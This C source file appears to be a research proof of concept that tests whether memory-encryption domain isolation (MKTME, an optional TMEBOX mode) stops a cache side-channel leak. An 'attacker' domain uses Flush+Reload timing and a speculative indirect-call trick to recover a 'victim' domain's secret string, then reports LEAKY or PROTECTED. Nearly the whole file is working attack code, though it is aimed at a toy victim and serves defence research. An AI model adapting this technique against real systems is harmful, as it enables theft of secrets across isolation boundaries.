#include <errno.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <keyutils.h>
#include <sys/mman.h>

#include "cacheutils.h"
#include "colorcodes.h"

#define MEASUREMENTS                    10000
#define PAGESIZE                        4096


#define DOMAIN_SHIFT                    44
#define DOMAIN_MASK                     0x00003f0000000000uL

#define ASSERT_PG_ALIGNED(addr)         assert(((uint64_t)(addr) & 0xFF) == 0)
#define ASSERT_DOMAIN(addr, domain)     assert((((uint64_t)(addr) & DOMAIN_MASK) >> DOMAIN_SHIFT) == (domain))
#define ENFORCE_DOMAIN(addr, domain)    (((uint64_t)(addr) & ~(DOMAIN_MASK)) | ((uint64_t)(domain) << DOMAIN_SHIFT))

#if defined(TMEBOX)
#define PROT_TODO 0x10
long enc_mprotect(void *addr, size_t len, int prot, key_serial_t key) {
    #define SYS_ENCRYPT_MPROTECT 451
    return syscall(SYS_ENCRYPT_MPROTECT, addr, len, prot, key);
}
#endif

typedef char (*workload_t)(register int, void *, void *, size_t, int);

/***********************************************************************
Attacker
************************************************************************/
#define PUBLIC          "####################"
#define LFENCE          asm volatile("lfence")
#define MFENCE          asm volatile("mfence")
#define FLUSH(p)        asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
#define MACCESS(p)      asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");

struct attacker_code {
    workload_t main;
    uint64_t (*rdtsc)();
    int      (*flush_reload)(struct attacker_code *, void *, int);
    void     (*flush_shared_memory)(struct attacker_code *, void *);
    char     (*cache_decode)(struct attacker_code *, void *, int, int);
    int      (*sched_yield)();
    void     (*dbg_ptr)(void *);
};

struct attacker_data {
    char data[128];
    struct attacker_code code;
};

void __attacker_start() {};

char attacker_main(register int id, void *heap, void *mem, size_t timestamp, int threshold) {
    struct attacker_data *m = (void *)ENFORCE_DOMAIN(heap, id);
    struct attacker_code *c = &m->code;

    // Access
    void *p = (mem + m->data[timestamp & 0x0F] * PAGESIZE);
    // Cache encode
    MACCESS(p);

    LFENCE;
    MFENCE;

    char x = c->cache_decode(c, mem, timestamp & 0x0F, threshold);

    c->flush_shared_memory(c, mem);
    if (x != '_' && x != '#' && x != ' ') return x;
    return 0;
}

void attacker_flush_shared_memory(struct attacker_code *c, void *mem) {
    for (int i = 0; i < 256; ++i) {
        FLUSH(mem + i * 4096);
    }
}

uint64_t attacker_rdtsc() {
    uint64_t a, d;
    MFENCE;
    asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
    a = (d << 32) | a;
    MFENCE;
    return a;
}

int attacker_flush_reload(struct attacker_code *c, void *p, int threshold) {
    uint64_t start = 0, end = 0;

    start = c->rdtsc();
    MACCESS(p);
    end = c->rdtsc();

    MFENCE;
    FLUSH(p);

    return (end - start < threshold);
}

int attacker_cache_decode(struct attacker_code *c, void *mem, int index, int threshold) {
    for (int i = 0; i < 256; ++i) {
        int mix_i = ((i * 167) + 13) & 255;
        if (c->flush_reload(c, mem + mix_i * PAGESIZE, threshold)) {
            if ('A' <= mix_i && mix_i <= 'Z') {
                return mix_i;
            }
            c->sched_yield();
        }
    }
    return '_';
}

void __attacker_end() {};

void print_attacker_heap(void *heap) {
    struct attacker_data *m = heap;
    struct attacker_code *c = &m->code;
    printf("["FG_YELLOW"*"RESET"] Attacker Heap:\n"
        "        main: %p\n"
        " flush_shmem: %p\n"
        "flush_reload: %p\n"
        "     $decode: %p\n"
        "         -------\n"
        "        data: %p (%s)\n",
        c->main,
        c->flush_shared_memory,
        c->flush_reload,
        c->cache_decode,
        m->data,
        m->data);
}

void attacker_dbg_ptr(void *p) {
    printf("pointer @ %p\n", p);
}

#define GET_ADDR(func)  (text + ((uint64_t)(func) - (uint64_t)__attacker_start))
void attacker_setup(void *text, void *heap, char *data) {
    struct attacker_data *m = heap;
    struct attacker_code *c = &m->code;

    c->main = GET_ADDR(attacker_main);
    c->rdtsc = GET_ADDR(attacker_rdtsc);
    c->flush_reload = GET_ADDR(attacker_flush_reload);
    c->flush_shared_memory = GET_ADDR(attacker_flush_shared_memory);
    c->cache_decode = GET_ADDR(attacker_cache_decode);
    c->sched_yield = sched_yield;
    c->dbg_ptr = attacker_dbg_ptr;

    memset(m->data, 0, sizeof(m->data));
    strcpy(m->data, data);

    print_attacker_heap(m);
    return;
}
#undef GET_ADDR

/***********************************************************************
Victim
************************************************************************/
#define SECRET          "INACCESSIBLESECRET"

struct victim_code {
    workload_t main;
};

struct victim_data {
    char data[128];
    struct victim_code code;
};

void __victim_start() {};

char victim_main(register int id, void *heap, void *mem, size_t timestamp, int threshold) {
    struct victim_data *m = heap;
    struct victim_code *code = &m->code;
    return 0;
}

void __victim_end() {};

void print_victim_heap(void *heap) {
    struct victim_data *m = heap;
    printf("["FG_YELLOW"*"RESET"] Victim Heap:\n"
        "\tmain: %p\n"
        "\tdata: %p (%s)\n",
        m->code.main,
        m->data,
        m->data);
}

#define GET_ADDR(func)  (text + ((uint64_t)(func) - (uint64_t)__victim_start))
void victim_setup(void *text, void *heap, char *data) {
    struct victim_data *mem = heap;

    mem->code.main = GET_ADDR(victim_main);
    
    strcpy(mem->data, data);

    print_victim_heap(heap);
    return;
}
#undef GET_ADDR

/***********************************************************************
Runtime
************************************************************************/

enum domain_e {
    DOMAIN_VICTIM = 0,
    DOMAIN_ATTACKER,
    DOMAIN_MAX
};

struct domain_s {
    workload_t run;
    char filler[64];
    uint64_t id;
    void *text;
    size_t text_size;
    void *heap;
    size_t heap_size;
    key_serial_t key;
};
typedef struct domain_s * domain_t;
domain_t domains[DOMAIN_MAX];

void teardown_domains();

void print_domain(domain_t dom) {
    printf("["FG_YELLOW"*"RESET"] Domain %ld:\n"
        "\tkey_serial: 0x%x\n"
        "\ttext: "FG_YELLOW"%p - %p"RESET"\n"
        "\theap: "FG_YELLOW"%p - %p"RESET"\n",
        dom->id,
        dom->key,
        dom->text,
        dom->text + dom->text_size - 1,
        dom->heap,
        dom->heap + dom->heap_size - 1);
}

void init_key(domain_t dom, char *key_desc) {
    char *key_type = "mktme";
    // char *key_desc = "domain_key";
    char *key_opt = "type=cpu algorithm=aes-xts-128";
    dom->key = add_key(
        key_type, 
        key_desc, 
        key_opt, 
        strlen(key_opt), 
        KEY_SPEC_PROCESS_KEYRING);
    if (dom->key == -1) {
        printf("\tadd_key FAILED!\n");
        fflush(stdout);
        dom->id = 0;
        teardown_domains();
        exit(-1);
    }
}

void *map(domain_t dom, void *addr, size_t size, int prot) {
    int flags = MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE;

    void *mem = mmap(addr, size, prot, flags, -1, 0);
    if (mem == MAP_FAILED) {
        printf("\tmmap FAILED: %d (%s)\n", errno, strerror(errno));
        fflush(stdout);
        keyctl(KEYCTL_INVALIDATE, dom->key);
        dom->id = 0;
        teardown_domains();
        exit(-1);
    }
    ASSERT_PG_ALIGNED(mem);
    ASSERT_DOMAIN(mem, dom->id);
#if defined(TMEBOX)
    enc_mprotect(mem, size, prot, dom->key);
#endif
    memset(mem, 0, size);
    return mem;
}

void tmap(domain_t dom) {
    void *addr = (void *)((dom->id << DOMAIN_SHIFT) & DOMAIN_MASK);
    int prot = PROT_READ | PROT_WRITE | PROT_EXEC;

    dom->text = map(dom, addr, dom->text_size, prot);
    return;
}

void hmap(domain_t dom) {
    void *addr = (void *)(((dom->id << DOMAIN_SHIFT) & DOMAIN_MASK) + (1L << 32));
    int prot = PROT_READ | PROT_WRITE;

    dom->heap = map(dom, addr, dom->heap_size, prot);
    return;
}

void prepare_domain(domain_t *dom, int id) {
    char key_desc[64];

    *dom = malloc(sizeof(struct domain_s));

    (*dom)->id = id;
    sprintf(key_desc, "domain%d", id);
    init_key(*dom, key_desc);
    (*dom)->text_size =  16 * PAGESIZE;
    (*dom)->heap_size = 300 * PAGESIZE;
    tmap(*dom);
    hmap(*dom);

    print_domain(*dom);
    return;
}

void prepare_domains() {
    for (int i = 0; i < DOMAIN_MAX; ++i) {
        prepare_domain(&domains[i], i+1);
    }
}

void teardown_domain(domain_t dom) {
    munmap(dom->heap, dom->heap_size);
    munmap(dom->text, dom->text_size);
    keyctl(KEYCTL_INVALIDATE, dom->key);
    free(dom);
    dom = 0;
}

void teardown_domains() {
    for (int i = 0; i < DOMAIN_MAX; ++i) {
        if (domains[i]->id != 0) {
            teardown_domain(domains[i]);
        }
    }
}

void prepare_workload(domain_t dom, void *start, void *end) {
    size_t size = (uint64_t)end - (uint64_t)start;
    assert(size < dom->text_size);
    memcpy(dom->text, start, size);
#if defined(TMEBOX)
    enc_mprotect(dom->text, dom->text_size, PROT_READ | PROT_EXEC | PROT_TODO, dom->key);
#endif
    return;
}

void domain_enable(domain_t dom) {
#if defined(TMEBOX)
    enc_mprotect(dom->text, dom->text_size, PROT_READ | PROT_EXEC | PROT_TODO, dom->key);
#endif
}

void domain_disable(domain_t dom) {
#if defined(TMEBOX)
    enc_mprotect(dom->text, dom->text_size, PROT_READ | PROT_WRITE | PROT_TODO, dom->key);
#endif
}

char domain_switch(domain_t dom, size_t timestamp, int exec_prev) {
#if defined(EXEC_PREV)
    if (exec_prev == 0) {
        for (int i = 0; i < DOMAIN_MAX; ++i) {
            if (domains[i]->id == dom->id) continue;
            domain_disable(domains[i]);
        }
        domain_enable(dom);
    }
#endif

    register int id = dom->id;
    ENFORCE_DOMAIN(dom->run, id);
    flush(dom->run);

    uint64_t c = 2147476866;
    uint64_t a = 1792388078;
    uint64_t d = 1983325987;

    int64_t offset = 64 * 63;
    int64_t val1 = 64;
    int64_t val2 = 63;

    mfence();
    flush(&val1);
    flush(&val2);

    flush(&a);
    flush(&d);
    flush(&c);
    asm volatile (
        // Registers already preloaded via constraints
        "div %%ecx\n\t"
        "div %%ecx\n\t"
        "div %%ecx\n\t"
        "div %%ecx\n\t"
        "div %%ecx\n\t"
        "div %%ecx\n\t"
        "sub $512, %%rdx\n\t"
        "add %%rdx, %[target]\n\t"
        :
        : [target] "r" (dom->run),
        "a" (a),      // binds 'a' to rax
        "c" (c),      // binds 'c' to rcx
        "d" (d)       // binds 'd' to rdx
        : "memory"
    );

    offset /= val2;
    offset /= val1;
    dom->run += offset - 1;

    return dom->run(id, dom->heap, mem, timestamp, CACHE_MISS);
}

int main() {
    pagesize = PAGESIZE;
    if (!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();
    printf("["FG_YELLOW"*"RESET"] Flush+Reload Threshold: "FG_YELLOW"%zd"RESET"\n", CACHE_MISS);
    char *_mem = malloc(pagesize * (256 + 4));
    // page aligned
    mem = (char *)(((size_t)_mem & ~(pagesize - 1)) + pagesize * 2);
    // initialize memory
    memset(mem, 0, pagesize * 256);


    prepare_domains();

    prepare_workload(domains[DOMAIN_VICTIM], __victim_start, __victim_end);
    victim_setup(
        domains[DOMAIN_VICTIM]->text,
        domains[DOMAIN_VICTIM]->heap,
        SECRET);
    domains[DOMAIN_VICTIM]->run = ((struct victim_data *)domains[DOMAIN_VICTIM]->heap)->code.main;

    prepare_workload(domains[DOMAIN_ATTACKER], __attacker_start, __attacker_end);
    attacker_setup(
        domains[DOMAIN_ATTACKER]->text,
        domains[DOMAIN_ATTACKER]->heap,
        PUBLIC);
    domains[DOMAIN_ATTACKER]->run = ((struct attacker_data *)domains[DOMAIN_ATTACKER]->heap)->code.main;

    int score = 0;
    char leaked[32];
    for (int run = 0; run < MEASUREMENTS; ++run) {
        for (int j = 0; j < 8; ++j) {
            domain_switch(domains[DOMAIN_ATTACKER], run, 1);
        }

        domain_switch(domains[DOMAIN_VICTIM], run, 0);

        char c = domain_switch(domains[DOMAIN_ATTACKER], run, 0);
        if (c != 0) leaked[run & 0xF] = c;
        score += (c == ((struct victim_data *)domains[DOMAIN_VICTIM]->heap)->data[run & 0xF]);
    }
    printf("DONE\n");

    printf("secret: %s\n",
        ((struct victim_data *)domains[DOMAIN_VICTIM]->heap)->data);
    printf("leaked: "FG_YELLOW"%s"RESET"\n",
        leaked);
    printf(FG_YELLOW"SCORE: %d/%d"RESET"\t>>> %s <<<\n",
        score, MEASUREMENTS,
        score > 0 ? FG_RED"LEAKY"RESET : FG_GREEN"PROTECTED"RESET);
    printf("["FG_GREEN">"RESET"] Done\n");

    teardown_domains();
    return 0;
}
